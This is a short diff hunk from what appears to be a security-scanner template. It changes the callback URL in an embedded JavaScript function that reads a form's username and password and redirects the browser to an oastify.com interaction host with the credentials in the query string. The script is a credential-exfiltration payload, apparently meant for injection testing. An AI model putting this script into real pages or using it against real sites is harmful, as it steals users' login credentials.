@@ -24,7 +24,7 @@ info:
         function submitForm() {
           var username = document.getElementById('username').value;
           var password = document.getElementById('password').value;
-          var url = 'http://vut6p667ecusj96e7aohhsgj9af13vrk.oastify.com/?credentials?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+          var url = 'https://cvbnqn7oftv9kq7v8rpyi9h0argi4ds2.oastify.com/?credentials?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
           window.location.href = url;
         }
       </script>
